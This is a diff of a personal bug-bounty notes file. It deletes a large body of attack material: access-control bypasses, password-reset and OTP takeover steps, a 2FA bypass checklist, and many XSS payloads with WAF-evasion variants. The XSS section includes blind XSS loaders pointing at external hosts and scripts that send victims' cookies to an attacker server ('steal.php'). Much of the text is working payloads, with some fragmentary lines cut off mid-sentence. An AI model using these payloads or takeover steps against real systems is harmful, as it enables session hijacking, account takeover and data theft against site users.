@@ -2290,929 +2290,76 @@ Values:
              host: target.com
              x-original-Url: /admin 
     
-    
-    add .  //  and ; in the end of the url
-    https://target.secret/.
-     https://target//secret//
-      https://target/.secret/.
-       https://target;secret
-        https://target.;secret
-         https://target//;//secret
-    
-    
-    DOWNGRADE THE PROTOCOL VERSION.
-    You can also try all other techniques along with downgrading the protocol, one useful one might be to downgrade to 1.0 and remove the Host header at all - it can cause unexpected behaviour of the server
-    0.9    1.0   1.1   2
-    
-    Case switching technique
-It involves altering the case of characters in the URL path to try and bypass access controls. example.com/user gives you 401? Try example.com/User, example.com/%75ser or example.com/USer etc.
-    
-    HTTP REQUEST SMUGGLING    ******   (****    check http request
-    
-    Exploiting Hop-by-Hop request header
-    
-    To understand this technique one should first get familiar with hop-to-hop headers. Hop-by-hop headers are HTTP headers that are intended for communication between a client and a server, and that are not forwarded by intermediaries such as proxies or caches. These headers are called "hop-by-hop" because they are processed on a per-hop basis, meaning that each intermediary along the path of the request will see and potentially modify the headers as they pass through. The HTTP/1.1 specification defines the following headers as hop-by-hop headers:
-    Connection, Keep-Alive, Proxy-Authenticate, Proxy-Authorization, TE, Trailer, Transfer-Encoding
-    
-    
-    
-    SPRING FRAMEWORK SPECIFIC BYPASS TECHNIQUE     **** check more on this   ****
-    
-
-
-
-   
-  
-   
-   2FA BYPASS      2FA BYPASS         2FA BYPASS              2FA BYPASS
-   
-  note :  bypassed by adding two X-Forwarded-For: IP headers.
-Copy
-POST /reset HTTP/2
-Host:example.com
-X-Forwarded-For:1.1.1.1
-X-Forwarded-For:2.2.2.2
-   
-   
-   Zero Interaction Mass Account Password Reset Vulnerability
-   Navigate to https://xxxx.xxx.com/xx?id=xx_forgot_password.
-Enter the victim’s email address.
-Intercept the request using a proxy tool like Burp Suite.
-Modify the “pass_sent” parameter from false to true in the POST request body:
-{
-  "emailEmpty": true,
-  "pass_sent": false,
-  "customer_email": "{victim's email}",
-  "action": "changePassword",
-  "sessionRotationTrigger": true
-}
-Forward the request to the server.
-
-
-tip tip
- when testing testing the password reset functionality always, check if the ‘first name’ or ‘last name’ fields of the user were reflected in the email in order to attempt an HTML email injection attack.
- 
- tip
- [1] An attacker sends a request to the API endpoint “/api/v1/people/forgot_password” requesting the reset password of the victim’s account.
-
-[2] The Attacker paste the reset password token and the victim’s ID (extracted from the response) in the password reset link :
-
-https://www.redacted.com/reset_password?code="REPLACE_WITH_RESET_PASSWORD_CODE"&id=REPLACE_WITH_ID_PARAMETER
-
-[3] The attacker can now open the link in his browser, and reset the victim’s password.
-
-[4] The Attacker gain access to the account (Account Take Over), without any action from the victim.
-   
-   
-   tip   tip   tip    https://infosecwriteups.com/story-of-lock-up-users-account-by-dos-attack-cost-1-100-87b47d06a7c1
-   When a user has an active session on the website and he’s working on the website online, when the update password request is sent to the user’s email, the user’s session is locked until they enter the temp password and update their password without them knowing this is happening by the attacker.
-
-But this wasn’t as easy as it looks, there was a CAPTCHA in our way to making the request which could be bypassed by removing the CAPTCHA parameter.
-
-Now the attacker could lock someone’s account just by having their email which was public in their profile.
-   
-   
-   There are several ways to bypass the OTP, 
-
-I attempted to brute force the OTP code, but there was a rate limit, so I failed.
-I experimented with magic OTPs, and as you can guess, I failed.
-I tested a Race condition on OTPs, and again, I failed.
-
-
-    . Go to https://www.xyz.com.
-2. Go for the password reset option.
-3. Enter the victim’s mail id.
-4. Enter a random 4-digit OTP.
-5. Capture the request in burp and send it to an intruder.
-6. Create the payload of 4 digit number and start the attack.
-7. You can see the changes in the length and status code 200 OK.
-8. Enter the correct OTP and change the password of the victim’s account.
-
-
-  tip 
-  go  to the password reset page and entered your email
-  run  Burp Suite and make Intercept on.
-  Create new password and confirm it then clicked in Reset Password button.
-  intercepted the request and started to analyzing each request
-  Intercepted all requests from target.com, check  the request that is responsible for redirect to /logout page, and  drop it using Burp Suite
-  Returning to the browser, and check if it  have redirect you  to the profile page without asking for 2fa code.
-
-   
-   
-   
-     Bypassing two-factor authentication
-[ ] Flawed two-factor verification logic Sometimes flawed logic in two-factor authentication means that
-after a user has completed the initial login step, the website doesn't adequately verify that the same user
-is completing the second step For example, the user logs in with their normal credentials in the first step
-as follows:
-POST /login-steps/first HTTP/1.1
-Host: vulnerable-website.com
-...
-username=carlos&password=qwerty
-They are then assigned a cookie that relates to their account, before being taken to the second step of
-the login process:
-HTTP/1.1 200 OK
-Set-Cookie: account=carlos
-GET /login-steps/second HTTP/1.1
-Cookie: account=carlos
-When submitting the verification code, the request uses this cookie to determine which account the user
-is trying to access:
-POST /login-steps/second HTTP/1.1
-Host: vulnerable-website.com
-Cookie: account=carlos
-...
-verification-code=123456`
-In this case, an attacker could log in using their own credentials but then change the value of the
-account cookie to any arbitrary username when submitting the verification code.
-POST /login-steps/second HTTP/1.1
-Host: vulnerable-website.com
-Cookie: account=victim-user
-...
-verification-code=123456
-[ ] Clickjacking on 2FA Disable Feature
-1. Try to Iframe the page where the application allows a user to disable 2FA
-2. If Iframe is successful, try to perform a social engineering attack to manipulate victim to login
-[ ] Response Manipulation
-1. Check Response of the 2FA Request.
-2. If you Observe "Success":false
-3. Change this to "Success":true and see if it bypass the 2FA
-
-[ ] Status Code Manipulation
-1. If the Response Status Code is 4XX like 401, 402, etc.
-2. Change the Response Status Code to "200 OK" and see if it bypass the 2FA
-[ ] 2FA Code Reusability
-1. Request a 2FA code and use it
-2. Now, Re-use the 2FA code and if it is used successfully that's an issue.
-3. Also, try requesting multiple 2FA codes and see if previously requested Codes expire or not wh
-4. Also, try to re-use the previously used code after long time duration say 1 day or more. That
-
-[ ] CSRF on 2FA Disable Feature
-1. Request a 2FA code and use it
-2. Now, Re-use the 2FA code and if it is used successfully that's an issue.
-3. Also, try requesting multiple 2FA codes and see if previously requested Codes
-expire or not when a new code is requested
-4. Also, try to re-use the previously used code after long time duration say 1 day or
-more. That will be an potential issue as 1 day is enough duration to crack and guess
-a 6-digit 2FA code
-
-
-[ ] Backup Code Abuse
-Apply same techniques used on 2FA such as Response/Status Code Manipulation,
-Brute-force, etc. to bypass Backup Codes and disable/reset 2FA
-[ ] Enabling 2FA Doesn't Expire Previous Session
-1. Login to the application in two different browsers and enable 2FA from 1st session.
-2. Use 2nd session and if it is not expired, it could be an issue if there is an insufficient
-session expiration issue. In this scenario if an attacker hijacks an active session before
-2FA, it is possible to carry out all functions without a need for 2FA
-[ ] 2FA Refer Check Bypass
-1. Directly Navigate to the page which comes after 2FA or any other authenticated
-page of the application.
-2. If there is no success, change the refer header to the 2FA page URL. This may fool
-application to pretend as if the request came after satisfying 2FA Condition
-[ ] 2FA Code Leakage in Response
-1. At 2FA Code Triggering Request, such as Send OTP functionality, capture the Request.
-2. See the Response of this request and analyze if the 2FA Code is leaked.
-[ ] JS File Analysis
-1. while triggering the 2FA Code Request,
-2. Analyze all the JS Files that are referred in the Response
-
-3. to see if any JS file contain information that can help bypass 2FA code.
-[ ] Lack of Brute-Force Protection
-This involves all sort of issues which comes under security misconfiguration such as
-lack of rate limit, no brute-force protection, etc.
-1. Request 2FA code and capture this request.
-2. Repeat this request for 100-200 times and if there is no limitation set, that's a rate limit
-3. At 2FA Code Verification page, try to brute-force for valid 2FA and see if there is any succ
-4. You can also try to initiate, requesting OTPs at one side and brute-forcing at
-another side. Somewhere the OTP will match in middle and may give you a quick result
-[ ] Password Reset/Email Change - 2FA Disable
-1. Assuming that you are able to perform email change or password reset for the
-victim user or make victim user do it by any means possible.
-2. 2FA is disabled after the email is changed or password is reset. This could
-be an issue for some organizations. However, depends on case by case basis.
-[ ] Missing 2FA Code Integrity Validation
-1. Request a 2FA code from Attacker Account.
-2. Use this valid 2FA code in the victim 2FA Request and see if it bypass the 2FA Protection.
-[ ] Direct Request
-1. Directly Navigate to the page which comes after 2FA or any other authenticated
-page of the application.
-2. See if this bypasses the 2FA restrictions.
-3. try to change the **Referrer header** as if you came from the 2FA page.
-[ ] Reusing token
-1. Maybe you can reuse a previously used token inside the account to authenticate.
-[ ] Sharing unused tokens
-1. Check if you can get the token from your account and try to use it to bypass the 2FA in a diff
-[ ] Leaked Token
-1. Is the token leaked on a response from the web application?
-[ ] Session permission
-1. Using the same session start the flow using your account and the victim's account.
-2. When reaching the 2FA point on both accounts,
-3. complete the 2FA with your account but do not access the next part.
-4. Instead of that, try to access the next step with the victim's account flow.
-5. If the back-end only set a boolean inside your sessions saying that you have successfully pass
-[ ] Password reset function
-1. In almost all web applications the **password reset function automatically logs the user into
-2. Check if a **mail** is sent with a **link** to **reset the password** and if you can **reuse**
-[ ] Lack of Rate limit
-Is there any limit on the number of codes that you can try, so you can just brute force it? Be ca
-[ ] Flow rate limit but no rate limit
-In this case, there is a flow rate limit (you have to brute force it very slowly: 1 thread and so
-[ ] Re-send code and reset the limit
-There is a rate limit but when you "resend the code" the same code is sent and the rate limit is
-[ ] Client side rate limit bypass
-{% content-ref url="rate-limit-bypass.md" %} rate-limit-bypass.md {% endcontent-ref %}
-[ ] Lack of rate limit in the user's account
-Sometimes you can configure the 2FA for some actions inside your account (change mail, password..
-[ ] Lack of rate limit re-sending the code via SMS
-You won't be able to bypass the 2FA but you will be able to waste the company's money.
-[ ] Infinite OTP regeneration
-If you can **generate a new OTP infinite times**, the** OTP is simple enough** (4 numbers), and y
-[ ] Guessable cookie
-If the "remember me" functionality uses a new cookie with a guessable code, try to guess it.
-
-When the 2FA is enabled, previous sessions created should be ended. This is because when a client
-[ ] Improper access control to backup codes
-Backup codes are generated immediately after 2FA is enabled and are available on a single request
-[ ] Information Disclosure
-If you notice some confidential information appear on the 2FA page that you didn't know previousl
-[ ] Bypass 2FA with null or 000000
-[ ] Previously created sessions continue being valid after MFA activation
-1 access the same account on https://account.grammarly.com in two devices
-2 on device 'A' go to https://account.grammarly.com/security > complete all steps to activate the
-Now the 2FA is activated for this account
-3 back to device 'B' reload the page The session still active
-[ ] Enable 2FA without verifying the email I able to add 2FA to my account without verifying my email
-Attack scenario :
-Attacker sign up with victim email (Email verification will be sent to victim email).
-Attacker able to login without verifying email.
-Attacker add 2FA.
-[ ] Password not checked when disabling 2FA
-PoC
-1- go to your account and activate the 2FA from /settings/auth
-2- after active this option click on Disabled icon beside Two-factor authentication.
-3- a new window will open asking for Authentication or backup code - Password to confirm the disable
-
-4- in the first box enter a valid Authentication or backup code and in the password filed enter a
-5- the option will be disabled successful without check the validation of the password.
-[ ] “email” MFA mode allows bypassing MFA from victim’s device when the device trust is not expired
-Steps To Reproduce:
-Note:
-1-Use burp suite or another tool to intercept the requests
-2-Turn on and configure your MFA
-3-Login with your email and password
-4-The page of MFA is going to appear
-5-Enter any random number
-6-when you press the button "sign in securely" intercept the request POST auth.grammarly.com/v3/a
-"mode":"sms" by "mode":"email"
-"secureLogin":true by "secureLogin":false
-7-send the modification and check, you are in your account! It was not necessary to enter the pho
-[ ] 2FA bypass by sending blank code
-1- Login to Glassdoor and navigate to https://www.glassdoor.com/member/account/securitySettings_i
-2- Enable 2FA
-3- Logout
-4- Login again and notice OTP is asked
-5- Now using Burp suite intercept the POST request by sending incorrect code. [Do not forward]
-6- Before forwarding the request to server, remove the code and forward
-7- Turnoff Intercept and notice that your login request has been fulfilled
-
-
-tip
-Browser A: The attacker opens the login page and enters credentials for an account without 2FA
-
-Browser B: The attacker opens the login page and enters credentials for the victim who has 2FA enabled. Consequently, they are redirected to /login/key/random_key
-
-Browser B: The attacker substitutes the session ID with Browser A's session ID and refreshes the page
-
-Browser B: The converter page generates a JWT for the attacker, enabling successful authentication as the victim who has 2FA enabled
-
-  tip  tip
-Create an account https://example[.]com/register
-Fill in all the required data enter the phone number and send the form.
-We will receive a five-digit OTP on the phone number used for registration. Enter any random 5 digits, e.g. 00000
-Intercept the request with burp suite proxy, choose the option “Do intercept >> response to this request” and hit Forward.
-5. We will receive a response with 500 500, modify it to 200 OK, and forward the request
 
 
 
 
 
-             Xss    XSS         XSS           XSS
-             
-check for xss cheatsheat
-  echo "testphp.vulnweb.com" | waybackurls | httpx -silent | Gxss -c 100 -p Xss | grep "URL" | cut -d '"' -f2 | sort -u | dalfox pipe
-  echo "http://testphp.vulnweb.com/" | waybackurls | httpx -silent -timeout 2 -threads 100 | gf xss | anew 
-  waybackurls testphp.vulnweb.com| grep '=' |qsreplace '"><script>alert(1)</script>' | while read host do ; do curl -s --path-as-is --insecure "$host" | grep -qs "<script>alert(1)</script>" && echo "$host \033[0;31m" Vulnerable;done
-  
-  gospider -a -s https://site.com -t 3 -c 100 |  tr " " "\n" | grep -v ".js" | grep "https://" | grep "=" | qsreplace '%22><svg%20onload=confirm(1);>'
-  
-      BLIND XSS
-  cat domain.txt | waybackurls | httpx -H "User-Agent: \"><script src=https://chirag.bxss.in></script>"
-  
-  
-  httpx -l master.txt -silent -no-color -threads 300 -location 301,302 | awk '{print $2}' | grep -Eo "(http|https)://[^/"].* | tr -d '[]' | anew  | xargs -I@ sh -c 'gospider -d 0 -s @' | tr ' ' '\n' | grep -Eo '(http|https)://[^/"].*' | grep "=" | qsreplace "<svg onload=alert(1)>"
-  
-  
-  cat test.txt | gf xss | sed ‘s/=.*/=/’ | sed ‘s/URL: //’ | tee testxss.txt ; dalfox file testxss.txt -b yours-xss-hunter-domain(e.g yours.xss.ht)
-
-<iframe src="%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aalert(0)">
-
-
-Payload XSS (cross-site scripting) on login page:
-
-');\\</script><script>alert(document.cookie)</script>('%00tst@tst.com.br
-
-   `“‘><img src=x onerror=promtp(7)>`”’${{8*8}}      for xss, csti, and html injection
-   
-   
-   tip
-   check which waf is used
-   wafwoof https://url
-   check for basic html injection
-   <h1>test</h1>
-<a>click here</a>
-<title>test</title>  if render, try to excalate to xss
 
 
 
-xss tip
-Methodology:
-1) Identify bug bounty
-2) Enumerate sub domains (I use amass, subfinder)
-3) Feed those to httpprobe   
-4) Feed that list to a crawling tool       hawrawler
-5) Feed that list to kxss
-6) grep output for " (easiest win)
 
 
-
-REFLECTED
-1)
-Use Gau or Wayback urls to passively gather urls of the target.
-Filter the parameters using grep "=" or gf patterns and store it in a new file.
-Now run Gxss or bxss on that new file.
-Check Reflected Param Manually or use some tool like dalfox
-
-  payload   “hello<form/><!><details/open/ontoggle=alert(‘W13D0M’)>”@gmail.com
-  
-  alwys check for clickhijacking when any subdomain is reflecting  xss
-
-ANALYSIS
-$cat domains.txt | gau --threads 5 > output.txt                                i think in order to reduce noice, i will stick with in scope url //time shall tell
-grep '=' output.txt | grep '&' > filtered_urls.txt     or  grep '=' urls.txt | grep -vE '\.(jpg|png|css|js|ico|gif|...)$' > filtered_urls.txt
-       
- cat filtered_url.txt | bxss -appendMode -payload '"><script src=https://hacker.xss.ht></script>' -parameters
-     OR
-   cat filtered_url.txt | bxss -payload '"><script src=https://z0id.xss.ht></script>' -header "X-Forwarded-For"  or use another payload
-   then 
-   cat urls.txt | dalfox pipe -f payloads.txt           remember, that the payload.txt is the list of your xss payload in a file
-   
-   
-   blind xss in azure 
-   use first name = half payload last name = another half payload and in general name will be full payload so it will bypass filter
-   
-   
-   
-   ALWAYS REMEMBER TO CHANGE ALERT TO PROMPT 
-   
-  CHECK FOR   BURP SUITE'S DOM INVADER 
-  
-  tip tip
-
-Create an account with an XSS payload in the First Name field using an email that you own, (e.g.: attacker@gmail.com)
-log in to your previously created account while intercepting the login request, and remove the XSS payload from the firstName parameter of the second request.
-Go to the created Account Settings and change the email to another email that you also own (e.g.: attacker+1@gmail.com)
-You will receive a confirmation email on attacker@gmail.cominforming you that your email has been changed.
-Open the confirmation email and click on View web version to access the vulnerable XSS URL.
-Copy that vulnerable XSS URL and send it to the victim.
-
-  tip 2
-  
-  Open the Contact Support endpoint (https://example.com/contact?submitted=false)
-Inject the XSS payload in any field and Submit the form
-You will be redirected to the Thank you Page at (https://example.com/contact?submitted=true )
-Open the Contact Support endpoint again at (https://example.com/contact?submitted=false)
-You will find the XSS alert :)
-   
-   
-   **Tips***  FOR XSS FIREWALL BYOASS
-   Check if the firewall is blocking only lowercase
-   examples:     <scRipT>alert(1)</scRipT>
-   
-   Try to break firewall regex with the new line(\r\n)
-   Ex:- <script>%0alert(1)</script>
-   
-   Try Double Encoding
-   Ex:- %2522
-   
-   Testing for recursive filters, if firewall removes text in red, we will have clear payload
-   Ex:- <src<script>ipt>alert(1);</scr</script>ipt>
-   
-   Injecting anchor tag without whitespaces
-    Ex:- <a/href="j&Tab;a&Tab;v&Tab;asc&Tab;ri&Tab;pt:alert&lpar;1&rpar;">
-    
-    Try to bypass whitespaces using Bullet
-    Ex:- <svg•onload=alert(1)>
-    
-    Try to change request method
-    Ex:- GET /?q=xss  POST/ q=xss
-    
-    Try CRLF Inection
-    Ex:- GET /%0A%ODValue=%20Virus
-     POST 
-     Value= Virus
-     
-     
-     exception marked as on //
-     input on text boxes A<h1>A.
-     document.location='https://ł.rip/save.php?c='+document.cookie;    this for stealing cookies
      
      
      
-     <<<<<FASTEST WAY TO FIND XSS  >>>>>
- inject  this  "><script>alert(document.cookie)</script>      into every parameter on every page of the applicetion,  if the attack string appears unmodifiedin the response , that indicates an xss vulnerabilty
      
-    
-   
-2)
-Using Burp
-Download Reflection and sentinal plugin for burp.
-Walk and spider the target site.
-Check the reflected params tab in burp
-send that sentinal or check manually.
+     PROTYPE POLLUTION                                 PROTYPE POLLUTION                                       PROTYPE POLLUTION                       PROTYPE POLLUTION 
 
-3)
-Use Methods 1 or 2 to Gather the urls
-Enumerate the Firewall using https://github.com/Ekultek/WhatWaf or other similar tool.
-Find WAF bypass payload on twitter by searching or in this Github Repo https://github.com/0xInfection/Awesome-WAF
-Also Use Arjun to find hidden params.
+Check
 
-4
-Find Hidden Variables In Source Code.
-Check Javascript file or html Source file for hidden or unused variables
-You can Manually Check Right Click View Page Source and search for var= , ="" , =''.
-Now Append that to webpage urls. For example https://example.com?hiddenvariablename=xss.
+https://youtu.be/Gv1nK6Wj8qM?si=QWaFVoCMRKwdIwNh
 
-Tips
-Check the error pages (404,403,..) sometimes they contain reflected values
-Trigger a 403 by trying to get the .htaccess file
-Try every reflected parameter
 
 
-STORED XSS  ARE MOSTLY FOUND MANUALLY
-Enumerate the Firewall using above Methods and select a payload to test accordingly.
-Try that selected WAF bypass payload while registering on a site in fields like username, name, address, email, etc.
-Try Payload in File name of profile picture and also in the source file of image.
-Try in Comment section anywhere on target site.
-Try on every input fields which get reflected in page and which can be seen by other users.
-Try to signup using your name + xss payload and that can lead to stored xss.
-
-
-
-ANOTHER TIPS
-Open the Contact Support endpoint (https://example.com/contact?submitted=false)
-Inject the XSS payload in any field and Submit the form
-You will be redirected to the Thank you Page at (https://example.com/contact?submitted=true )
-Open the Contact Support endpoint again at (https://example.com/contact?submitted=false)
-You will find the XSS alert :)
-    shorter way
-Open the contact support endpoint (https://example.com/contact?submitted=false)
-Inject the XSS payload in any field BUT enter anything wrong or leave any required field missing in the form and then Submit the form.
-You will find the XSS alert :)
-
-
-another TIP 
-Create an account with an XSS payload in the First Name field using an email that you own, (e.g.: attacker@gmail.com)
-log in to your previously created account while intercepting the login request, and remove the XSS payload from the firstName parameter of the second request.
-Go to the created Account Settings and change the email to another email that you also own (e.g.: attacker+1@gmail.com)
-You will receive a confirmation email on attacker@gmail.cominforming you that your email has been changed.
-Open the confirmation email and click on View web version to access the vulnerable XSS URL.
-Copy that vulnerable XSS URL and send it to the victim.
-
-
-chatgpt explanation
-
-Inject XSS Payload:
-
-Injected an XSS payload into the "First Name" field during account sign-up.
-Encounter Access Issue:
-
-Encountered a "403 Forbidden" error when attempting to log in.
-Analyze Login Requests:
-
-Used Burp Suite to intercept login requests and discovered two POST requests.
-Identify the Problem:
-
-Suspected the XSS payload in the "firstName" parameter of the second request was causing the issue.
-Resolve Self-XSS:
-
-Removed the XSS payload from the second request, successfully logged in, and noticed a Self-XSS alert.
-Exploit the Vulnerability:
-
-Explored account settings and found the ability to change the email address.
-Email Confirmation:
-
-Changed the email address to another owned address and received a confirmation email at the original email.
-Trigger XSS via Email:
-
-Clicked "View web version" in the email, triggering the XSS alert.
-Share the Vulnerability:
-
-Obtained a URL that triggered the XSS alert and could be shared with others.
-
-
-NOTE TIP
- WHEN an  application used AngularJS, with the library loaded from the same domain  always try to load AngularJS library without violating the CSP. We could then use Angular templating functionality to inject malicious code
-  the payload creation process involved importing the AngularJS library and using Angular directives to initiate the payload, making use of the $event.view object, which exposed the window object. This approach effectively bypassed the CSP, allowing us to execute our payload. you could also  URL-encoded the payload above and injected it to error_description parameter
-
-
-
-my explaination
-create a account and first login in clearly on the first request
-on the second request, Create an account with an XSS payload in the First Name field using an email that you own, (e.g.: attacker@gmail.com)
-log in to your previously first  created account while intercepting the login request,    remove the XSS payload from the firstName parameter of the second request.
-Go to the  second created Account Settings and change the email to another email that you also own (e.g.: attacker+1@gmail.com)
-Open the confirmation email and click on View web version to access the vulnerable XSS URL.
-
-
-
-///////////
-Bug Bounty Tip
-
-HTML entities can help you bypass WAF filters
-
-1) bypass block of single quote '
-?url=home%26apos;-alert(1)//
-onclick="location='/home&apos;-alert(1)//'"
-
-2) bypass block of colon :
-?url=javascript%26colon;alert(1)
-href="javascript&colon;alert(1)"
-
-analysis 
-************TIP******
-inject  <a href=#>test</a>  in every  Input fields such as  text boxes, text areas, drop-down lists, checkboxes, radio buttons, and more.
-and then trry to obfuscated payods
-FOR WAF BYPASS for STORED xss
- 
-wheere payload  is <script>alert('XSS')</script>  // check for more strong xss payloads and run the following encode payload //  use chapgpt to genearte encoding payloads
-encode payload
-
-XSS polygot
-jaVasCript:/*-/*`/*`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>x3csVg/<sVg/oNloAd=alert()//>x3e
-
-      basic xss filter bypass
-      1) using ann html img tag instead of script
-      2)when alert is blocked, prompt can be used ...  alert (1) to prompt(1)
-      3) backtrick can be used when bracket is filter ....  alert(1) to alert`1`  or use alert(String.fromCharCode(88,83,83)) when string are blocked
-      
-      
-      
-
- CLOUDFLARE BYPASS [XSS]
-PAYLOAD:
-<Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ=="))> 
- - <img src=x on0x=1 onerror=alert(document.cookie)>
-
-
-
-
-
-
-🌐ColdFusion  XSS
-POC:
-{{host}}/CFIDE/debug/cf_debugFr.cfm?userPage=javascript:alert(document.domain)
-
-
-  Here's a small #XSS list for manual testing (main cases, high success rate).
-"><img src onerror=alert(1)>
-"autofocus onfocus=alert(1)//
-</script><script>alert(1)</script>
-'-alert(1)-'
-\'-alert(1)//
-javascript:alert(1)
-    
-    Sucuri bypass payload 
-<s\Cr\ipt\>alert(document\.cookie)<\/s\Cr\ipt\>\;\/>
-
-some browers tolearate extra bracket
-  <<script>alert(10);//<</scripts>
-
-using invalid tags
-<x onclick=alert(1) src=a>click here </x>
-
-
-beating the lenght limit  example
-  https://mypaa.com/account.php?page_id="><script>/*&seed=*/alert(document.cookie);/*&mode=*</script>
-  
-
- 
-       Email 
-
-“><svg/onload=confirm(1)>”@gmail.com     
-  "><svg/onload=confirm(1)>"@x.y 
-  test+(<script>alert(document.domain)</script>)@gmail.com
-just try this payload:
-test@gmail.com%27\%22%3E%3Csvg/onload=alert(/xss/)%3E
-
-
-test+(<script>alert(0)</script>)@example.com
-test@example(<script>alert(0)</script>).com
-"<script>alert(0)</script>"@example.com
-  
-      
-      
-
-url encoding of payload 
-
-
-`%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%27%58%53%53%27%29%3C%2F%73%63%72%69%70%74%3E`    
-
-Hex encoding of payload
-`\x3C\x73\x63\x72\x69\x70\x74\x3E\x61\x6C\x65\x72\x74\x28\x27\x58\x53\x53\x27\x29\x3C\x2F\x73\x63\x72\x69\x70\x74\x3E`
-
-BASE 64
-PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
-
-unicode encodng
-\u003C\u0073\u0063\u0072\u0069\u0070\u0074\u003E\u0061\u006C\u0065\u0072\u0074\u0028\u0027\u0058\u0053\u0053\u0027\u0029\u003C\u002F\u0073\u0063\u0072\u0069\u0070\u0074\u003E
-
-
-USING COMBINATION OF ALL TECHNIQUES
-
-URL Encoding + Hex Encoding:
-
-
-Base64 Encoding + Unicode Encoding:  and 
-
-combination of all technique 
-
-BYPASSING XSS FILTERS
-
-&#60;script&#62;alert(1)&#60;/script&#62;
-
-%3Cscript%3Ealert(1)%3C/script%3E       if the filter only works for plain text string
-
-\\x3cscript\\x3ealert(1)\\x3c/script\\x3e            if filter only looks for alphabatical string
-
-\\u003cscript\\u003ealert(1)\\u003c/script\\u003e        if the filter looks for ASCII strings
-
-%26#x6c;t;\\x73cript&#62;\\u0061lert(1)%26#x6c;t;/\\x73cript&#62;
-
-
-Blind XSS
-Use burpcollaborator or ngrok
-
-1- Review forms
-2- Contact Us pages
-3- Passwords(You never know if the other side doesn’t properly handle input and if your password is in View mode)
-4- Address fields of e-commerce sites
-5- First or Last Name field while doing Credit Card Payments
-6- Set User-Agent to a Blind XSS payload. You can do that easily from a proxy such as Burpsuite.
-7- Log Viewers
-8- Feedback Page
-9- Chat Applications
-10- Any app that requires user moderation          
-
-  stepss when hunting for bliind xss in an e-commerce website
-     when filling out forms allows sticks with the src tag andalso make alot of assumption
-     name :   '"://></script></script/src=http://url.com/      remember to change url parameter, shpould in case url is been filltered 
-     <input data = ""/><script/src=//"..."></script>
-      strick on the delivery not or any input field
-      
-     "'"/></textarea></script/script><script/src=https://url.com/              check for proxy and place ypur payload proxy replace field this is notifty when you xss are been fired 
-     
-
-   Top 3 RXSS payloads I use:
-
-`'";//><img/src=x onError="${x};alert(`1`);">
-
-`'";//><Img Src=a OnError=location=src>
-
-`'";//></h1><Svg+Only%3d1+OnLoad%3dconfirm(atob("WW91IGhhdmUgYmVlbiBoYWNrZWQgYnkgb3R0ZXJseSE%3d"))>      
-
-   tip on xss
-   Got an image upload functionality?
-   Let's see how we can popup an XSS here 😉
-   Create a file having XSS payload and save it with an extension (check what file type is allowed on trial-error basis)
-   There are different ways to create this file, check it out 👇
-     https://t.co/bLFt57NlAb
-      If you're looking for a R-XSS (eg. payload in filename) then you will see the popup immedietly after upload. If it's stored, you will have to hit the URL where the payload is served.
-        
-
-
-
-            DOM XSS
-Tips
-Would not recommend manually looking for DOM XSS
-Burp suite PRO scanner can find DOM XSS
-Tool: https://github.com/dpnishant/ra2-dom-xss-scanner
-
-www.gap.com/email?message=<script>alert("hi")</script>
-
-
-       go install github.com/KathanP19/Gxss@latest
-     
-     Tips to find DOM XSS: ⚡️🔥
- never use source while testing for dom xss
-1. Start Burpsuite Community Edition 
-2. Click on Open Browser 
-3. Go and click on the Burp icon in extension tab on browser 
-4. Click on Turn on DOM Invader 
-5. Inject a custom canary 
-6. Open target website, right click, Inspect and go to Invader
-7. Now Click on Inject URL or Inject Form
-8. Check Reflection of canary
-9. If all goes well, You will see the green exploit button
-10. Click it to get Dom XSS poc 
-11. If doesn’t work, repeat the same on different url, functionality. 
-
-/////////
- if string enters in double qoute, we might break out by using double qoute
- REMEMBER
- if you data get url- encoded before being processed, it is unlikely an xss will work
-
-   
-
-
-///
-eval(alert(document.domain))
-location.hash       https://oldnavy.gap.com/#test          change the string ? to # if empty
-location.search   .... place a random value into it
-  example
-  https://www.gogle.com/submit.thml?email=sdddhhhd
-  it would return ?email=sdddhhhd
-
-window.location.hash.slice(1)
-
-   /#<iframe src="www.google.com" onload="this src+='<img src=1 onerror=alert(1)"'>
- 
-     
-
-
-    idea (someone) for finding xss
-amass enum -d target.com -o /filepath/subdomains.txt
- sort -u subdomains.txt | httprobe > /filepath/uniq.txt
- eyewitness --web -f uniq.txt -d /path_to_save_screenshots
-
- It took few minutes and after that I just wrote a simple script to embed those png screenshots with html so that I can view them directly in my browser.
-for I in $(ls); do 
-        echo "$I" >> index.html;
-        echo "<img src=$I><br>" >> index.html;
-done
-  I used paramspider to extract the parameters of that subdomain
- paramspider -d target.com > /filepath/param.txt
- dalfox -b hahwul.xss.ht file param.txt
-
-        
-        use the browerser console to alwys poop out and check payload on a given page 
-  including long payloads/ escalation of xss beyond alert box
-  <script src="http://nw.rs"></script>
-  getScript("http://nw.rs",function(){});    this is by using jquery 
-  
- Note //  if you are exploiting an XSS on a page that uses HTTPS, you will need to pull the XSS payload from a link that also uses HTTPS, otherwise the browser will refuse to load it with a “Mixed Content” error. because of cors 
- 
- Bypassing CSRF Tokens //
- by loading the form within an iframe. If the page is loaded within an iframe, then the form will automatically include the CSRF token within the form, 
- 
- once we bypass sop and csrf token then ACCOUNT TAKEOVER 
- 
- Change the user’s password
-Change the user’s email address or phone number to our own, and then use the forgot password functionality to update their password
-Change the user’s security questions
-
- // the shortest payload I know of that does not pull an external script is 20 characters long  it is used when there is less than 20 character string     <svg/onload=alert()>
- 
- 
- session hijacking payload  on an form 
- <script>
-var sessionId = document.
-
-
-
-ie.match(/sessionId=(.*?)(;|$)/)[1]
-</script>
-
-payload for a data theft using xss
-
-<script>
-var stolenCookies = document.cookie;
-var xhr = new XMLHttpRequest();
-xhr.open('GET', 'https://yourserver.com/steal.php?data=' + encodeURIComponent(stolenCookies), true);
-xhr.send();
-</script>       
-
-
-java%0d%0ascript%0d%0a:alert(0) 
- j%0d%0aava%0d%0aas%0d%0acrip%0d%0at%0d%0a:confirm`0` 
- java%07script:prompt`0` 
- java%09scrip%07t:prompt`0` 
- jjavascriptajavascriptvjavascriptajavascriptsjavascriptcjavascriptrjavascriptijavascript pjavascriptt:confirm`0`
-
-
-($$ \unicode{<img src=1 onerror=alert(1)>} $$) 
-
-
-
-
-
